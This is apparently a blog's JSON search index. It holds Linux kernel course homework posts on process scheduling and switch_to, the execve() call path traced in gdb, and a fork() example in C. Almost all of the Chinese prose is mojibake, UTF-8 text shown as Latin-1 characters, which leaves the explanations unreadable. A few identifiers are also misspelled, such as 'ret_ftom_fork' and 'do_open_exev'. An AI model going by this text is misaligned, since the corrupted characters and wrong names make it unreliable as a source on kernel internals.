å…¶ä¸­prepare_task_switchï¼ˆï¼‰å‡½æ•°æ˜¯å®Œæˆåˆ‡æ¢å‰çš„å‡†å¤‡å·¥ä½œï¼›æ¥ç€åé¢åˆ¤æ–­å½“å‰è¿›ç¨‹æ˜¯ä¸æ˜¯å†…æ ¸çº¿ç¨‹ï¼Œå¦‚æœæ˜¯å†…æ ¸çº¿ç¨‹ï¼Œåˆ™ä¸éœ€è¦åˆ‡æ¢ä¸Šä¸‹æ–‡\næ¥ç€è°ƒç”¨switch_mm(),æŠŠè™šæ‹Ÿå†…å­˜ä»ä¸€ä¸ªè¿›ç¨‹æ˜ å°„åˆ‡æ¢åˆ°æ–°è¿›ç¨‹ä¸­\nè°ƒç”¨switch_to(),ä»ä¸Šä¸€ä¸ªè¿›ç¨‹çš„å¤„ç†å™¨çŠ¶æ€åˆ‡æ¢åˆ°æ–°è¿›ç¨‹çš„å¤„ç†å™¨çŠ¶æ€ã€‚è¿™åŒ…æ‹¬ä¿å­˜ã€æ¢å¤æ ˆä¿¡æ¯å’Œå¯„å­˜å™¨ä¿¡æ¯\nå¦‚æœnextæ˜¯å†…æ ¸çº¿ç¨‹ï¼Œåˆ™çº¿ç¨‹ä½¿ç”¨prevæ‰€ä½¿ç”¨çš„åœ°å€ç©º;schedule( )å‡½æ•°æŠŠè¯¥çº¿ç¨‹è®¾ç½®ä¸ºæ‡’æƒ°TLBæ¨¡å¼\näº‹å®ä¸Šï¼Œæ¯ä¸ªå†…æ ¸çº¿ç¨‹å¹¶ä¸æ‹¥æœ‰è‡ªå·±çš„é¡µè¡¨é›†(task_struct-\u0026gt;mm = NULL)ï¼›æ›´ç¡®åˆ‡åœ°è¯´ï¼Œå®ƒä½¿ç”¨ä¸€ä¸ªæ™®é€šè¿›ç¨‹çš„é¡µè¡¨é›†ã€‚ä¸è¿‡ï¼Œæ²¡æœ‰å¿…è¦ä½¿ä¸€ä¸ªç”¨æˆ·æ€çº¿æ€§åœ°å€å¯¹åº”çš„TLBè¡¨é¡¹æ— æ•ˆï¼Œå› ä¸ºå†…æ ¸çº¿ç¨‹ä¸è®¿é—®ç”¨æˆ·æ€åœ°å€ç©ºé—´ã€‚\nå¦‚æœnextæ˜¯ä¸€ä¸ªæ™®é€šè¿›ç¨‹ï¼Œschedule( )å‡½æ•°ç”¨nextçš„åœ°å€ç©ºé—´æ›¿æ¢prevçš„åœ°å€ç©ºé—´\n|\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;| | } else | | switch_mm(oldmm, mm, next); | |\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;|\nå¦‚æœprevæ˜¯å†…æ ¸çº¿ç¨‹æˆ–æ­£åœ¨é€€å‡ºçš„è¿›ç¨‹ï¼Œcontext_switch()å‡½æ•°å°±æŠŠæŒ‡å‘prevå†…å­˜æè¿°ç¬¦çš„æŒ‡é’ˆä¿å­˜åˆ°è¿è¡Œé˜Ÿåˆ—çš„prev_mmå­—æ®µä¸­ï¼Œç„¶åé‡æ–°è®¾ç½®prev-\u0026gt;active_mm\ncontext_switch()æœ€åè°ƒç”¨switch_to()æ‰§è¡Œprevå’Œnextä¹‹é—´çš„è¿›ç¨‹åˆ‡æ¢äº† |\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-| | switch_to(prev, next, prev); | |\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-| return prev; }\nï¼”)switch_toï¼ˆï¼‰å‡½æ•°è§£æ switch_to(prev, next, prev)ï¼šåˆ‡æ¢å †æ ˆå’Œå¯„å­˜å™¨çš„çŠ¶æ€ï¼\nswitch_toæ˜¯ä¸€ä¸ªå®å®šä¹‰ï¼Œå®Œæˆçš„å·¥ä½œä¸»è¦æ˜¯ï¼š\n(1)ä¿å­˜å½“å‰è¿›ç¨‹çš„flagsçŠ¶æ€å’Œå½“å‰è¿›ç¨‹çš„ebp \u0026quot;pushfl\\n\\t\u0026quot;\t/* save flags */\t\u0026quot;pushl %%ebp\\n\\t\u0026quot;\t/* save EBP */\t(2)å®Œæˆå†…æ ¸å †åœ¨espçš„åˆ‡æ¢ \u0026quot;movl %%esp,%[prev_sp]\\n\\t\u0026quot; /* save ESP */ \u0026quot;movl %[next_sp],%%esp\\n\\t\u0026quot; /* restore ESP */ è¿›ç¨‹åˆ‡æ¢çš„æ—¶å€™ï¼Œè¦ä¿®æ”¹å †æ ˆï¼Œeipç­‰æ•°æ®ï¼åœ¨switch_toä¸­å®Œæˆäº†è¿™ä¸ªå·¥ä½œã€‚\n(3)ä¿å­˜eipçš„å€¼ \u0026quot;movl $1f,%[prev_ip]\\n\\t\u0026quot; /* save EIP */ \\\r\u0026quot;pushl %[next_ip]\\n\\t\u0026quot; /* restore EIP */ \\\rå°†æ ‡å·1:çš„åœ°å€ä¿å­˜åˆ°prev-\u0026gt;thread.ipä¸­ï¼Œç„¶åä¸‹ä¸€æ¬¡è¯¥è¿›ç¨‹è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œå°±ä»ï¼‘çš„ä½ç½®å¼€å§‹æ‰§è¡Œã€‚ æ³¨æ˜ï¼šå¦‚æœä¹‹å‰nextä¹Ÿè¢«switch_toå‡ºå»è¿‡ï¼Œé‚£ä¹ˆnext-\u0026gt;thread.ipé‡Œå­˜çš„å°±æ˜¯ä¸‹é¢è¿™ä¸ª1fçš„æ ‡å·ï¼Œä½†å¦‚æœnextè¿›ç¨‹åˆšåˆšè¢«åˆ›å»ºï¼Œä¹‹å‰æ²¡æœ‰è¢«switch_toå‡ºå»è¿‡ï¼Œé‚£ä¹ˆnext-\u0026gt;thread.ipé‡Œå­˜çš„å°†æ˜¯ret_ftom_forkï¼Œå³è¿›ç¨‹åˆšåˆšè¢«forkåæ‰§è¡Œexecï¼\n(4)jmp __switch_to è®©å‚æ•°ä¸å‹å…¥å †æ ˆï¼Œè€Œæ˜¯ä½¿ç”¨å¯„å­˜å™¨ä¼ å€¼ï¼Œæ¥è°ƒç”¨__switch_to eaxå­˜æ”¾prev,edxå­˜æ”¾nextã€‚\näºŒ.gdbè·Ÿè¸ªscheduleå‡½æ•° å°ç»“ï¼šæ•´ä¸ªscheduleçš„æ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤º\n|\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-| schedule\nsched_submit_work(tsk)\n_schedule()\npick_next_task\ncontext_switch(rq,prev,next)\nprepare_task_switch\nåˆ¤æ–­æ˜¯ä¸æ˜¯å†…æ ¸çº¿ç¨‹\nswitch_mm\nswitch_to\n_switch_to\nfinish_task_switch\n","date":1427029467,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1427029467,"objectID":"b34a5f67bdc2591d0170c963d6fb4e91","permalink":"http://www.guozet.me/post/Linux-kernel-analysis-task-management/","publishdate":"2015-03-22T13:04:27Z","relpermalink":"/post/Linux-kernel-analysis-task-management/","section":"post","summary":"Linuxå†…æ ¸è¯¾ç¬¬å…«å‘¨ä½œä¸šã€‚æœ¬æ–‡åœ¨äº‘è¯¾å ‚ä¸­å®éªŒæ¥¼å®Œæˆã€‚ åŸåˆ›ä½œå“è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ ã€ŠLinuxå†…æ ¸åˆ†æã€‹MOOCè¯¾ç¨‹\n","tags":"Linux kernel","title":"Linuxå†…æ ¸åˆ†æè¯¾ç¨‹8_è¿›ç¨‹è°ƒåº¦ä¸è¿›ç¨‹åˆ‡æ¢è¿‡ç¨‹","type":"post"},{"authors":null,"categories":"Linux","content":"Linuxå†…æ ¸è¯¾ç¬¬ä¸ƒå‘¨ä½œä¸šã€‚æœ¬æ–‡åœ¨äº‘è¯¾å ‚ä¸­å®éªŒæ¥¼å®Œæˆã€‚ å”å›½æ³½ åŸåˆ›ä½œå“è½¬è½½è¯·æ³¨æ˜å‡ºå¤„.\nã€ŠLinuxå†…æ ¸åˆ†æã€‹MOOCè¯¾ç¨‹\næ˜”è€…åº„å‘¨æ¢¦ä¸ºè´è¶ï¼Œæ ©æ ©ç„¶è´è¶ä¹Ÿï¼Œè‡ªå–»é€‚å¿—ä¸ï¼Œä¸çŸ¥å‘¨ä¹Ÿã€‚ä¿„ç„¶è§‰ï¼Œåˆ™è˜§è˜§ç„¶å‘¨ä¹Ÿã€‚ä¸çŸ¥å‘¨ä¹‹æ¢¦ä¸ºè´è¶ä¸ï¼Œè´è¶ä¹‹æ¢¦ä¸ºå‘¨ä¸ï¼Ÿå‘¨ä¸è´è¶ï¼Œåˆ™å¿…æœ‰åˆ†çŸ£ã€‚æ­¤ä¹‹è°“ç‰©åŒ–ã€‚ï¼ˆã€Šåº„å­Â·é½ç‰©è®ºã€‹ï¼‰\nåœ¨æˆ‘ä»¬çš„æ“ä½œç³»ç»Ÿä¸­,ä¹Ÿæœ‰å¦‚æ­¤æµªæ¼«æƒ…æ€€çš„åº„ç”Ÿæ¢¦è¶\u0026mdash;\u0026ndash;exec()å‡½æ•°æ—.\nåº„å‘¨ï¼ˆè°ƒç”¨execveçš„å¯æ‰§è¡Œç¨‹åºï¼‰å…¥ç¡ï¼ˆè°ƒç”¨execveé™·å…¥å†…æ ¸ï¼‰ï¼Œé†’æ¥ï¼ˆç³»ç»Ÿè°ƒç”¨execveè¿”å›ç”¨æˆ·æ€ï¼‰å‘ç°è‡ªå·±æ˜¯è´è¶ï¼ˆè¢«execveåŠ è½½çš„å¯æ‰§è¡Œç¨‹åºï¼‰\nä¸€. execå‡½æ•°æ— (ä¸€) ä»‹ç» fork()å‡½æ•°, ç›¸å½“äºæ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„è¿›ç¨‹, ä½†è¯¥å­è¿›ç¨‹å¤åˆ¶çš„ç¡®å®çˆ¶è¿›ç¨‹çš„å†…å®¹, å¦‚æœè®©å…¶æ‰§è¡Œä¸‹å»,é‚£ä¹ˆä¹Ÿæ˜¯æ‰§è¡Œå’Œçˆ¶è¿›ç¨‹ç›¸åŒçš„å†…å®¹å‘¢, ä½†å®é™…ä¸­,æˆ‘ä»¬æ‰§è¡Œçš„æ˜¯æ–°çš„ä»»åŠ¡, é‚£ä¹ˆåœ¨è¿™é‡Œæ˜¯å¦‚ä½•å®ç°çš„å‘¢?\nexecå‡½æ•°æ—å°±å®ç°äº†åœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­å¯åŠ¨å¦å¤–ä¸€ä¸ªç¨‹åºçš„æ–¹æ³•. å®ƒå¯ä»¥æ ¹æ®æŒ‡å®šçš„æ–‡ä»¶åæˆ–ç›®å½•åæ‰¾åˆ°å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶ç”¨å®ƒæ¥å–ä»£åŸè°ƒç”¨è¿›ç¨‹çš„æ•°æ®æ®µã€ä»£ç æ®µå’Œå †æ ˆæ®µï¼Œåœ¨æ‰§è¡Œå®Œä¹‹åï¼ŒåŸè°ƒç”¨è¿›ç¨‹çš„å†…å®¹é™¤äº†è¿›ç¨‹å·å¤–ï¼Œå…¶ä»–å…¨éƒ¨è¢«æ–°çš„è¿›ç¨‹æ›¿æ¢äº†ã€‚å¦å¤–ï¼Œè¿™é‡Œçš„å¯æ‰§è¡Œæ–‡ä»¶æ—¢å¯ä»¥æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯Linuxä¸‹ä»»ä½•å¯æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶ã€‚\né‚£ä»€ä¹ˆæ—¶å€™ä½¿ç”¨execå‡½æ•°å‘¢? é™¤äº†æˆ‘ä»¬ä¸Šé¢æåˆ°çš„fork()ä¹‹åè°ƒç”¨exec()å‡½æ•°æ¥æ‰§è¡Œä¸€ä¸ªæ–°è¿›ç¨‹å¤–,è¿˜æœ‰å½“è¿›ç¨‹è®¤ä¸ºè‡ªå·±ç»§ç»­æ‰§è¡Œä¸‹å»ä¹Ÿæ²¡æœ‰ä»€ä¹ˆå®é™…çš„å·¥ä½œçš„æ—¶å€™,å°±å¯ä»¥è°ƒç”¨execå‡½æ•°æ¥åº„å‘¨æ¢¦è¶,åŒ–æˆè¶äº†.\n(äºŒ) å‡½æ•°æ—å…·ä½“å®ç° åœ¨linuxä¸‹,æœ‰å…­ä¸ªexecå¼€å¤´çš„å‡½æ•°, æ¥å®ç°:\nè¿™6ä¸ªå‡½æ•°åœ¨å‡½æ•°åå’Œä½¿ç”¨è¯­æ³•çš„è§„åˆ™ä¸Šéƒ½æœ‰ç»†å¾®çš„åŒºåˆ«ï¼Œä¸‹é¢å°±ä»å¯æ‰§è¡Œæ–‡ä»¶æŸ¥æ‰¾æ–¹å¼ã€å‚æ•°ä¼ é€’æ–¹å¼å’Œç¯å¢ƒå˜é‡è¿™å‡ ä¸ªæ–¹é¢è¿›è¡Œæ¯”è¾ƒã€‚\næŸ¥æ‰¾æ–¹å¼ï¼šè¡¨1ä¸­çš„å‰4ä¸ªå‡½æ•°çš„æŸ¥æ‰¾æ–¹å¼éƒ½æ˜¯å®Œæ•´çš„æ–‡ä»¶ç›®å½•è·¯å¾„ï¼Œè€Œæœ€åä¸¤ä¸ªå‡½æ•°ï¼ˆä¹Ÿå°±æ˜¯ä»¥ p ç»“å°¾çš„ä¸¤ä¸ªå‡½æ•°ï¼‰å¯ä»¥åªç»™å‡ºæ–‡ä»¶åï¼Œç³»ç»Ÿå°±ä¼šè‡ªåŠ¨æŒ‰ç…§ç¯å¢ƒå˜é‡â€œ$PATHâ€ æ‰€æŒ‡å®šçš„è·¯å¾„è¿›è¡ŒæŸ¥æ‰¾ã€‚\nå‚æ•°ä¼ é€’æ–¹å¼ï¼šexecå‡½æ•°æ—çš„å‚æ•°ä¼ é€’æœ‰ä¸¤ç§ï¼šä¸€ç§æ˜¯é€ä¸ªåˆ—ä¸¾çš„æ–¹å¼ï¼Œè€Œå¦ä¸€ç§åˆ™æ˜¯å°†æ‰€æœ‰å‚æ•°æ•´ä½“æ„é€ æŒ‡é’ˆæ•°ç»„ä¼ é€’ã€‚åœ¨è¿™é‡Œæ˜¯ä»¥å‡½æ•°åçš„ç¬¬5ä½å­—æ¯æ¥åŒºåˆ†çš„ï¼Œå­—æ¯ä¸º \u0026ldquo;l\u0026rdquo;(list)çš„è¡¨ç¤ºé€ä¸ªåˆ—ä¸¾å‚æ•°çš„æ–¹å¼ï¼Œå…¶è¯­æ³•ä¸ºï¼š\n`const char *arg;å­—æ¯ä¸ºâ€œvâ€(vector)çš„è¡¨ç¤ºå°†æ‰€æœ‰å‚æ•°æ•´ä½“æ„é€ æŒ‡é’ˆæ•°ç»„ä¼ é€’ï¼Œå…¶è¯­æ³•ä¸º char *const argv[]\u0026rsquo;``ã€‚\nè¿™é‡Œçš„å‚æ•°å®é™…ä¸Šå°±æ˜¯ç”¨æˆ·åœ¨ä½¿ç”¨è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶æ—¶æ‰€éœ€çš„å…¨éƒ¨å‘½ä»¤é€‰é¡¹å­—ç¬¦ä¸²ï¼ˆåŒ…æ‹¬è¯¥å¯æ‰§è¡Œç¨‹åºå‘½ä»¤æœ¬èº«ï¼‰ã€‚è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™äº›å‚æ•°å¿…é¡»ä»¥NULLç»“æŸã€‚\nç¯å¢ƒå˜é‡ï¼š execå‡½æ•°æ—å¯ä»¥é»˜è®¤ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ï¼Œä¹Ÿå¯ä»¥ä¼ å…¥æŒ‡å®šçš„ç¯å¢ƒå˜é‡ã€‚è¿™é‡Œä»¥ â€œeâ€(environment)ç»“å°¾çš„ä¸¤ä¸ªå‡½æ•° execle()å’Œ execve()å°±å¯ä»¥åœ¨ envp[]ä¸­æŒ‡å®šå½“å‰è¿›ç¨‹æ‰€ä½¿ç”¨çš„ç¯å¢ƒå˜é‡ã€‚\nè¡¨2å†å¯¹è¿™6ä¸ªå‡½æ•°ä¸­çš„å‡½æ•°åå’Œå¯¹åº”è¯­æ³•åšäº†ä¸€ä¸ªå°ç»“ï¼Œä¸»è¦æŒ‡å‡ºäº†å‡½æ•°åä¸­æ¯ä¸€ä½å¯¹åº”æ‰€è¡¨æ˜çš„å«ä¹‰ï¼Œä»¥æ­¤è¡¨åŠ ä»¥è®°ä½è¿™6ä¸ªå‡½æ•°ã€‚\näº‹å®ä¸Šï¼Œè¿™6ä¸ªå‡½æ•°ä¸­çœŸæ­£çš„ç³»ç»Ÿè°ƒç”¨åªæœ‰execve()ï¼Œå…¶ä»–5ä¸ªéƒ½æ˜¯åº“å‡½æ•°ï¼Œå®ƒä»¬æœ€ç»ˆéƒ½ä¼šè°ƒç”¨execve()è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ã€‚åœ¨ä½¿ç”¨execå‡½æ•°æ—æ—¶ï¼Œä¸€å®šè¦åŠ ä¸Šé”™è¯¯åˆ¤æ–­è¯­å¥ã€‚exec å¾ˆå®¹æ˜“æ‰§è¡Œå¤±è´¥ï¼Œå…¶ä¸­æœ€å¸¸è§çš„åŸå› æœ‰ï¼š\næ‰¾ä¸åˆ°æ–‡ä»¶æˆ–è·¯å¾„ï¼Œæ­¤æ—¶ errno è¢«è®¾ç½®ä¸º ENOENTã€‚ æ•°ç»„argv å’Œenvp å¿˜è®°ç”¨NULLç»“æŸï¼Œæ­¤æ—¶ï¼Œerrnoè¢«è®¾ç½®ä¸º EFAULã€‚ æ²¡æœ‰å¯¹åº”å¯æ‰§è¡Œæ–‡ä»¶çš„è¿è¡Œæƒé™ï¼Œæ­¤æ—¶ errno è¢«è®¾ç½®ä¸ºEACCESã€‚ äºŒ.å®éªŒåˆ†æ å®è·µæ¥æ£€éªŒç†è®º, æ‰èƒ½è®©è‡ªå·±çš„çŸ¥è¯†å­¦ä¹ çš„æ›´åŠ ç‰¢å›ºã€‚\nè¿›å…¥gdbè°ƒè¯•,è®¾ç½®æ–­ç‚¹:\nä¸»è¦è®¾ç½®äº†ä»¥ä¸‹å‡ ä¸ªæ–­ç‚¹ã€‚\nb sys_execve\rb do_execve\rb do_open_exev\rb do search_binary_handler\rb load_elf_binary\rb start_thread\rb init_elf_binfmt\rä¸‹é¢å°±ä¸»è¦åˆ†æè¿™å‡ ä¸ªæ–­ç‚¹å¤„çš„å‡½æ•°åŠŸèƒ½å®ç°äº†.\n1.é¦–å…ˆåˆ†æå‡½æ•°å®ç° åœ¨å‡½æ•°ä¸­,æˆ‘ä»¬å¯æ˜æ˜¾çš„çœ‹åˆ°,åœ¨forkæ‰§è¡Œå®Œæˆä¹‹å,æˆ‘ä»¬é€šè¿‡execlp()åŠ è½½äº†å¯æ‰§è¡Œç¨‹åºhello.\nåœ¨è¿™é‡Œè°ƒç”¨çš„æ˜¯execlp(), æœ€ç»ˆè°ƒç”¨çš„ä¹Ÿæ˜¯execve()è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ã€‚\næ¸…æ™°çš„çœ‹åˆ°, ç³»ç»Ÿè°ƒç”¨ä¹‹åæ‰§è¡Œäº†do_execve()\n2.do_execve()å‡½æ•°åˆ†æ 1)åœ¨do_execveä¸­é™è®¾ç½®äº†ç›¸åº”çš„å‚æ•°å’Œç¯å¢ƒå˜é‡,ç„¶åè°ƒç”¨äº†do_execve_common()å‡½æ•° 2)do_execve_common()å‡½æ•°ä»‹ç» åœ¨do_execve_common()å‡½æ•°ä¸­,å…ˆæ‰“å¼€å¯¹åº”æ–‡ä»¶,åœ¨è¿™é‡Œæ˜¯hello\næ¥ç€å°†æ–‡ä»¶å,ç¯å¢ƒå˜é‡,å‘½ä»¤è¡Œå‚æ•°æ‹·è´åˆ°æ–°åˆ†é…çš„é¡µé¢ä¸­:\næœ€åæ‰§è¡Œ exec_binprmæ¥æ‰§è¡Œè¯¥å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼çš„å¤„ç†å‡½æ•°:\næ¥ç€è¯¦ç»†åˆ†æexec_binprmä¸­å‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹, åˆ†æå¦‚ä½•æ¥åŠ è½½elfæ–‡ä»¶æ ¼å¼çš„.\nåœ¨è¯¥å‡½æ•°ä¸­, å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†search_binary_handler(bprm)å‡½æ•°,è¯¥å‡½æ•°å¯»æ‰¾ç¬¦åˆæ–‡ä»¶æ ¼å¼å¯¹åº”çš„è§£ææ¨¡å—.\nå…¶ä¸­çš„linux_binfmt *fmtç»“æ„ä½“ä¸º:\næˆ‘ä»¬è¿™é‡Œè°ƒç”¨çš„æ˜¯helloå¯æ‰§è¡Œæ–‡ä»¶,ä¸ºelfæ ¼å¼,æ‰€æœ‰æœ€åæŸ¥æ‰¾åè°ƒç”¨ä¸º:\nå¯¹åº”elfæ ¼å¼æŸ¥æ‰¾å¯å¾—:\nå¯¹äºELFæ ¼å¼çš„å¯æ‰§è¡Œæ–‡ä»¶fmt-\u0026gt;load_binary(bprm);æ‰§è¡Œçš„åº”è¯¥æ˜¯load_elf_binaryå…¶å†…éƒ¨æ˜¯å’ŒELFæ–‡ä»¶æ ¼å¼è§£æçš„éƒ¨åˆ†éœ€è¦å’ŒELFæ–‡ä»¶æ ¼å¼æ ‡å‡†ç»“åˆèµ·æ¥é˜…è¯»\nå¯¹åº”elfæ–‡ä»¶çš„æ ¼å¼ä¸º:\næ•´ä¸ªELFæ˜ åƒå°±æ˜¯ç”±æ–‡ä»¶å¤´ã€åŒºæ®µå¤´è¡¨ã€ç¨‹åºå¤´è¡¨ã€ä¸€å®šæ•°é‡çš„åŒºæ®µã€ä»¥åŠä¸€å®šæ•°é‡çš„éƒ¨æ„æˆï¼Œè€ŒELFæ˜ åƒçš„è£…å…¥/å¯åŠ¨è¿‡ç¨‹ï¼Œåˆ™å°±æ˜¯åœ¨å„ç§å¤´éƒ¨ä¿¡æ¯çš„æŒ‡å¼•ä¸‹å°†æŸäº›éƒ¨æˆ–åŒºæ®µè£…å…¥ä¸€ä¸ªè¿›ç¨‹çš„ç”¨æˆ·ç©ºé—´ï¼Œå¹¶ä¸ºå…¶è¿è¡Œåšå¥½å‡†å¤‡(ä¾‹å¦‚è£…å…¥æ‰€éœ€çš„å…±äº«åº“)ï¼Œæœ€å(åœ¨ç›®æ ‡è¿›ç¨‹é¦–æ¬¡å—è°ƒåº¦è¿è¡Œæ—¶)è®©CPUè¿›å…¥å…¶ç¨‹åºå…¥å£çš„è¿‡ç¨‹ã€‚æ¥ç€æ˜¯å¯¹elf_bss ã€elf_brkã€start_codeã€end_codeç­‰ç­‰å˜é‡çš„åˆå§‹åŒ–ã€‚è¿™äº›å˜é‡åˆ†åˆ«çºªå½•ç€å½“å‰(åˆ°æ­¤åˆ»ä¸ºæ­¢)ç›®æ ‡æ˜ åƒçš„bssæ®µã€ä»£ç æ®µã€æ•°æ®æ®µã€ä»¥åŠåŠ¨æ€åˆ†é…â€œå †â€ åœ¨ç”¨æˆ·ç©ºé—´çš„ä½ç½®ã€‚é™¤start_codeçš„åˆå§‹å€¼ä¸º0xffffffffå¤–ï¼Œå…¶ä½™å‡ä¸º0ã€‚éšç€æ˜ åƒå†…å®¹çš„è£…å…¥ï¼Œè¿™äº›å˜é‡ä¹Ÿä¼šé€æ­¥å¾—åˆ°è°ƒæ•´ã€‚\nload_elf_binaryå‡½æ•°çš„ä½œç”¨å°±æ˜¯è¯»å…¥äº†ç¨‹åºå¤´è¡¨ï¼Œå¹¶å¯¹start_codeç­‰å˜é‡è¿›è¡Œåˆå§‹åŒ–.\nåœ¨load_elf_binaryçš„æœ€åè°ƒç”¨\nåœ¨è¿™é‡Œå°±æŠŠæ–°ç¨‹åºçš„ipå’Œspå­˜å…¥å †æ ˆ,è¦†ç›–æ‰äº†ä¹‹å‰çš„ip,sp,ä¹‹å,å­è¿›ç¨‹è¿”å›çš„è¯,å°±ä»helloä¸­çš„mainå¼€å§‹æ‰§è¡Œäº†.\n3.å‡½æ•°æ‰§è¡Œæµç¨‹ç¤ºæ„å›¾: execlp-\u0026gt;hello\rcall *sys_execve\r........do_execve\r................. do_execve_common\r......................... exec_binprm\r...................................search_binary_handler(bprm)\r.........................................linux_binfmt= elf_format\r..............................................elf_format-\u0026gt; load_elf_binary\r..............................................load_elf_binary\r.....................................................start_thread\rret\r","date":1426338267,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1426338267,"objectID":"36f04cacba021220bbe3f5ace05ea0a0","permalink":"http://www.guozet.me/post/Linux-kernel-analysis-execve-Function/","publishdate":"2015-03-14T13:04:27Z","relpermalink":"/post/Linux-kernel-analysis-execve-Function/","section":"post","summary":"Linuxå†…æ ¸è¯¾ç¬¬ä¸ƒå‘¨ä½œä¸šã€‚æœ¬æ–‡åœ¨äº‘è¯¾å ‚ä¸­å®éªŒæ¥¼å®Œæˆã€‚ å”å›½æ³½","tags":"Linux kernel","title":"Linuxå†…æ ¸åˆ†æè¯¾ç¨‹7_execve()å‡½æ•°å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å¤„ç†è¿‡ç¨‹","type":"post"},{"authors":null,"categories":"Linux","content":"Linuxå†…æ ¸è¯¾ç¬¬å…­å‘¨ä½œä¸šã€‚æœ¬æ–‡åœ¨äº‘è¯¾å ‚ä¸­å®éªŒæ¥¼å®Œæˆã€‚\nå”å›½æ³½ åŸåˆ›ä½œå“è½¬è½½è¯·æ³¨æ˜å‡ºå¤„.\nã€ŠLinuxå†…æ ¸åˆ†æã€‹MOOCè¯¾ç¨‹\nfork()ç³»ç»Ÿè°ƒç”¨ é¢„å¤‡çŸ¥è¯† è¿™é‡Œå…ˆåˆ—å‡ºä¸€äº›å¿…è¦çš„é¢„å¤‡çŸ¥è¯†ï¼Œå¯¹linuxä¸‹è¿›ç¨‹æœºåˆ¶æ¯”è¾ƒç†Ÿæ‚‰çš„æœ‹å‹å¯ä»¥ç•¥è¿‡ã€‚\nè¿›ç¨‹å¯ä»¥çœ‹åšç¨‹åºçš„ä¸€æ¬¡æ‰§è¡Œè¿‡ç¨‹ã€‚åœ¨linuxä¸‹ï¼Œæ¯ä¸ªè¿›ç¨‹æœ‰å”¯ä¸€çš„PIDæ ‡è¯†è¿›ç¨‹ã€‚PIDæ˜¯ä¸€ä¸ªä»1åˆ°32768çš„æ­£æ•´æ•°ï¼Œå…¶ä¸­1ä¸€èˆ¬æ˜¯ç‰¹æ®Šè¿›ç¨‹initï¼Œå…¶å®ƒè¿›ç¨‹ä»2å¼€å§‹ä¾æ¬¡ç¼–å·ã€‚å½“ç”¨å®Œ32768åï¼Œä»2é‡æ–°å¼€å§‹ã€‚ linuxä¸­æœ‰ä¸€ä¸ªå«è¿›ç¨‹è¡¨çš„ç»“æ„ç”¨æ¥å­˜å‚¨å½“å‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ã€‚å¯ä»¥ä½¿ç”¨â€œps auxâ€å‘½ä»¤æŸ¥çœ‹æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ã€‚ è¿›ç¨‹åœ¨linuxä¸­å‘ˆæ ‘çŠ¶ç»“æ„ï¼Œinitä¸ºæ ¹èŠ‚ç‚¹ï¼Œå…¶å®ƒè¿›ç¨‹å‡æœ‰çˆ¶è¿›ç¨‹ï¼ŒæŸè¿›ç¨‹çš„çˆ¶è¿›ç¨‹å°±æ˜¯å¯åŠ¨è¿™ä¸ªè¿›ç¨‹çš„è¿›ç¨‹ï¼Œè¿™ä¸ªè¿›ç¨‹å«åšçˆ¶è¿›ç¨‹çš„å­è¿›ç¨‹ã€‚ [ä¸Šè¿°æ‘˜è‡ª: ä»ä¸€é“é¢è¯•é¢˜è°ˆlinuxä¸‹forkçš„è¿è¡Œæœºåˆ¶]\nä¸‹é¢åˆ†æä¸€ä¸ªç®€å•çš„ä¾‹å­:\n#include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;stdlib.h\u0026gt;\r#include \u0026lt;unistd.h\u0026gt;\rint main(int argc, char * argv[])\r{\rint pid;\r/* fork another process */\rpid = fork();\rif (pid \u0026lt; 0) { /* error occurred */\rfprintf(stderr,\u0026quot;Fork Failed!\u0026quot;);\rexit(-1);\r} else if (pid == 0) {\r/* child process */\rprintf(\u0026quot;This is Child Process!\\n\u0026quot;);\r} else { /* parent process */\rprintf(\u0026quot;This is Parent Process!\\n\u0026quot;);\r/* parent will wait for the child to complete*/\rwait(NULL);\rprintf(\u0026quot;Child Complete!\\n\u0026quot;);\r}\r}\ræ¯”è¾ƒç®€å•,è¿è¡Œç»“æœä¸º:\nThis is Child Process!\rThis is Parent Process!\rChild Complete!\råœ¨pid = fork()å‰,åªæœ‰ä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œè¿™æ®µä»£ç ,ä½†åœ¨è¿™æ¡è¯­å¥æ»å,å°±æœ‰ä¸¤ä¸ªè¿›ç¨‹åœ¨æ‰§è¡Œåé¢çš„ä»£ç äº†,æ¥ä¸‹æ¥çš„ä»£ç æ˜¯:\nif(pid.....)\nè¡¥å……: 